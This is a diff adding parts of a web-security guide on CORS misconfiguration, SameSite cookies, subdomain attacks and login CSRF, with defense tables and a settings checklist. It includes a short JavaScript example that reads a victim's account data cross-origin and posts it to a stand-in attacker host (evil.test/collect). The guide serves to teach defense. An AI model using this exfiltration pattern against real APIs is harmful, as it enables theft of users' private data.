+  alt="Three lanes: a page on evil.test, the browser, and api.example.com. The page calls fetch with credentials. The browser sends GET /account with Origin https://evil.test and the session cookie. The API echoes the Origin back: 200 OK with the account data, Allow-Origin https://evil.test and Allow-Credentials true. The origin matches, so the browser allows the read and the script has the data. The script then posts it to evil.test/collect, and the attacker has the shopper's data. The fix: compare Origin with an exact list, and never echo it back."
+  width={680}
+  height={596}
+  caption="Data theft: an API that echoes any Origin tells the browser that evil.test may read the response."
+/>
+
+<MoreDetail title="Attack: reading private data through a loose CORS setup">
+
+**How it works.** The API copies the request's `Origin` into `Access-Control-Allow-Origin` and allows credentials, so it names whichever site asks, as in the diagram above.
+
+**Example.**
+
+```js
+const res = await fetch("https://api.example.com/account", {
+  credentials: "include",
+});
+await fetch("https://evil.test/collect", {
+  method: "POST",
+  body: await res.text(),
+});
+```
+
+For this to work, the cookie must reach the API, so it needs `SameSite=None`, or the attacker needs a page on the same site (next attack). The same result follows from a weak origin check, an allowed `null`, or a trusted subdomain the attacker controls.
+
+**Defense.** An exact-match allowlist. With it, the API never names `evil.test`, and the browser blocks the read.
+
+</MoreDetail>
+
+<MoreDetail title="Attack: a sibling subdomain">
+
+**How it works.** The attacker finds a weak point on the same site: an XSS bug on a marketing subdomain, a staging app with weaker controls, or a **taken-over subdomain** - a DNS record that still points to a hosting service the company no longer uses, which the attacker then claims. A page there is inside the site boundary from Part 4, so `SameSite` does not stop its requests. From there the attacker can:
+
+- send requests that carry the session cookie, even with `SameSite=Strict`
+- read responses, if the CORS allowlist trusts all subdomains
+- set a cookie with `Domain=example.com` and the same name as the session cookie, which the browser then sends to the API alongside the real one. The API may read the attacker's cookie, logging the shopper in as the attacker or breaking their session.
+
+**Defense.** List exact origins, not `*.example.com`. Check `Origin` on routes that change data. Use the `__Host-` prefix where the cookie's path allows it, so a sibling cannot set a cookie with that name. Remove DNS records for services that are no longer used.
+
+</MoreDetail>
+
+<MoreDetail title="Attack: login CSRF">
+
+**How it works.** Instead of acting in the victim's account, the attacker's page submits the site's login form with the **attacker's** username and password. The victim is now logged in to the attacker's account without noticing. Anything they then enter, such as a card or an address, is saved where the attacker can see it.
+
+**Defense.** The same as for CSRF: an `Origin` check or a CSRF token on the login route as well, which is often left out because the user is not logged in yet.
+
+</MoreDetail>
+
+### Defenses
+
+| Defense                                                   | What it stops                                                      | Notes                                                                                                       |
+| --------------------------------------------------------- | ------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------- |
+| Exact-match origin allowlist, one per environment         | Data theft through CORS                                            | The most important CORS setting                                                                             |
+| `SameSite=Strict` or `Lax` on session cookies             | CSRF from other sites                                              | Does not stop same-site subdomains                                                                          |
+| `Origin` check on routes that change data                 | CSRF, including from same-site subdomains                          | Run it before the handler. Reject a cookie request with no `Origin` where browsers always send one          |
+| CSRF token                                                | CSRF when cookies must go cross-site (`SameSite=None`)             | A random value the page sends in a header or form field; the server compares it with the session            |
+| Fetch Metadata (`Sec-Fetch-Site`)                         | Cross-site requests in general                                     | The browser sends `same-origin`, `same-site`, `cross-site` or `none`; reject `cross-site` on private routes |
+| Require a JSON `Content-Type` or a custom header          | Simple-request CSRF                                                | Forces a preflight, which a disallowed origin cannot pass                                                   |
+| `HttpOnly`, `Secure` and `__Host-` on cookies             | Cookie theft by XSS, over HTTP, and by sibling subdomains          | `__Host-` needs `Path=/`                                                                                    |
+
+None of these is enough on its own. `SameSite` misses subdomains, an `Origin` check misses non-browser clients (which have no victim's cookie anyway), and CORS misses simple requests. Use them together.
+
+<Part id="checklist" number={7} total={7} title="Checklist" />
+
+Every setting from this guide, with the recommended value and the reason. CORS header names are shortened: each one starts with `Access-Control-`.
+
+| Setting                              | Recommended                                                    | Why                                                                         |
+| ------------------------------------ | -------------------------------------------------------------- | --------------------------------------------------------------------------- |
+| `Allow-Origin`                       | One exact origin, taken from a fixed list                      | Pattern checks and reflection let other sites read responses                |
+| Allowlist contents                   | HTTPS origins only; no `null`; nothing from other environments | Each extra entry is another place an attacker can start from                |
+| `Allow-Credentials`                  | `true` only if the API uses cookies                            | Without cookies, the API does not need it                                   |
+| `Allow-Methods`, `Allow-Headers`     | Only what the frontend uses                                    | A short list is easier to review                                            |
+| `Max-Age`                            | A few minutes to 2 hours                                       | Saves a preflight round trip on repeated calls                              |
+| `Vary: Origin`                       | On every response whose CORS headers depend on the request     | Stops caches mixing up responses for different origins                      |
+| Session cookie                       | `HttpOnly; Secure; SameSite=Strict` or `Lax`; no `Domain`      | Keeps it from script, plain HTTP, other sites and subdomains                |
+| Cookie name                          | `__Host-` prefix where `Path=/`                                | Sibling subdomains cannot set a cookie with that name                       |
+| Routes that change data              | Check `Origin` before the handler; consider `Sec-Fetch-Site`   | CORS does not stop simple requests, and `SameSite` does not stop subdomains |
+| Cross-site cookies (`SameSite=None`) | Avoid; if required, add CSRF tokens                            | Every site can make the browser send them                                   |
+| Request body                         | Reject unexpected `Content-Type` values                        | Stops JSON routes from accepting form-style CSRF                            |
